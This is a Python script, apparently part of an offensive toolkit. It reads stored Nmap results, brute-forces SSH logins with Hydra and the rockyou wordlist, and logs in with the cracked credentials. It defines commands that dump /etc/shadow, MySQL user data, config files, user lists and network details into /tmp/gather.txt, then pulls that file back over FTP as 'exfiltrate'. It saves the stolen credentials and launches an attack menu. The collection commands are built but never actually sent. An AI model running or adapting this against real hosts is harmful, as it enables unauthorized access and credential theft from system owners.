import json
import subprocess
import threading
import sys
import time
import os
import re
import pexpect
from colorama import Fore, Style, Back

# Retrieving information from the previous page
Ip = sys.argv[1]
Hostname = sys.argv[2]

# Set the flag to stop all threads
stop_threads = False
loading_ssh_bruteforce = False
loading_ssh_connection = False
loading_ftp_request = False

def loading_animation():
    global stop_threads, loading_ssh_bruteforce, loading_ssh_connection, loading_ftp_request
    animations = ['\\', '|', '/', '-']
    idx = 0
    while not stop_threads:
        if loading_ssh_bruteforce:
            print('\rRunning Hydra BruteForce... ' + animations[idx % len(animations)], end='', flush=True)
        elif loading_ssh_connection:
            print('\rEstablishing SSH Connection... ' + animations[idx % len(animations)], end='', flush=True)
        elif loading_ftp_request:
            print('\rPerforming FTP Request... ' + animations[idx % len(animations)], end='', flush=True)
        idx += 1
        time.sleep(0.1)

def brute_force_ssh(ip):
    global stop_threads, loading_ssh_bruteforce, loading_ssh_connection, loading_ftp_request
    stop_threads = False
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()

    # Load the JSON data from the file
    if os.path.isfile('database.json'):
        with open('database.json') as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = {'NMAP SCAN': {'Scan_Results': []}}  # Adjust default data structure
    else:
        data = {'NMAP SCAN': {'Scan_Results': []}}  # Adjust default data structure

    # Search for the Nmap scan result that matches the SSH port 22
    for scan in data.get('NMAP SCAN', {}).get('Scan_Results', []):
        if scan['port'] == 22 or scan['service'] == 'ssh':
            print("")
            print("------------------------------------------------------------")
            print(Fore.GREEN + f'Found SSH scan result: {scan}' + Style.RESET_ALL)
            print("")
            print(Fore.YELLOW + "Starting Hydra BruteForce on SSH Port. " + Style.RESET_ALL)            
            loading_ssh_bruteforce = True
            ssh_port = scan['port']  # Adjust to use 'port' key
            hydra_command = f'hydra -L ./assets/wordlist/usernames.txt -P ./assets/wordlist/rockyou.txt {ip} ssh -t 7 -q -I'
            process = subprocess.Popen(hydra_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            bruteforce_result = []
            login = None
            password = None
            for line in iter(process.stdout.readline, b''):
                line = line.decode().strip()
                match = re.match(r'\[\d+\]\[ssh\] host: .+?   login: (.+?)   password: (.+)', line)
                if match:
                    login = match.group(1)
                    password = match.group(2)
                    loading_ssh_bruteforce = False
                    print()
                    print("------------------------------------------------------------")
                    print(Fore.GREEN + f"Login: {login}, Password: {password}" + Style.RESET_ALL)
                    bruteforce_result.append({"IP": ip, "Username": login, "Password": password})
                    
                    # SSH connection to target machine
                    print( Fore.YELLOW + "Starting SSH gathering on target. " + Style.RESET_ALL)
                    loading_ssh_connection = True
                    ssh_command = f'sshpass -p {password} ssh {login}@{ip}'
                    ssh_process = subprocess.Popen(ssh_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    # Commands to execute for information gathering
                    commands = f"""
                    touch /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    hostname >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/issue >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/*-release >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/lsb-release >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/redhat-release >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    uname -a >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    uname -mrs >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    dmesg | grep Linux >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    ls /boot | grep vmlinuz- >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    ps auxw >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    last -a >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    ifconfig >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    ip a >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt 
                    route -n >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/resolv.conf >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/sysconfig/network >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/networks >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    iptables -L >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    netstat -auntp >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    lsof -i >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    lsof -i :80 >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    grep 80 /etc/services >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    netstat -antup >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    netstat -antpx >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    netstat -tulpn >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    find / -user {login} >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/group >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/shadow >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    ls -alh /var/mail/ >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /var/apache2/config.inc >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /var/lib/mysql/mysql/user.MYD >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /root/anaconda-ks.cfg >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    cat /etc/mysql/my.cnf >> /tmp/gather.txt && echo ";" >> /tmp/gather.txt
                    exit
                    """
                    loading_ssh_connection = False
                    print('')
                    print(Fore.YELLOW + 'SSH gathering DONE, going to download the target informations' + Style.RESET_ALL)

                    # Exfiltrate the text file to the current machine
                    loading_ftp_request = True
                    ftp_command = f'ftp {login}@{ip}:/tmp/gather.txt -o ./assets/collected/gather.txt'
                    child = pexpect.spawn(ftp_command)
                    child.expect('Password:')
                    child.sendline(password)

                    # Stop the brute-force process after finding a valid password
                    break

            process.wait()
            stop_threads = True
            loading_thread.join()

            # Load the JSON data from the file or create a new dictionary
            if os.path.isfile('database.json'):
                with open('database.json') as f:
                    try:
                        data = json.load(f)
                    except json.JSONDecodeError:
                        data = {'SSH Bruteforce': {'Results': []}}
            else:
                data = {'SSH Bruteforce': {'Results': []}}

            # Append the new scan results to the existing ones
            data['SSH Bruteforce'] = {'Results': bruteforce_result}
            with open('database.json', 'w') as f:
                json.dump(data, f, indent=4)
            print('')
            print(Back.GREEN + 'Gathering done going to attack menu...' + Style.RESET_ALL)
            break
    else:
        print(Fore.RED+ 'No SSH scan result found.' + Style.RESET_ALL)
        process.wait()
        stop_threads = True
        loading_thread.join()
        

brute_force_ssh(Ip)
subprocess.call(['python3', 'attack_menu.py', Ip, Hostname])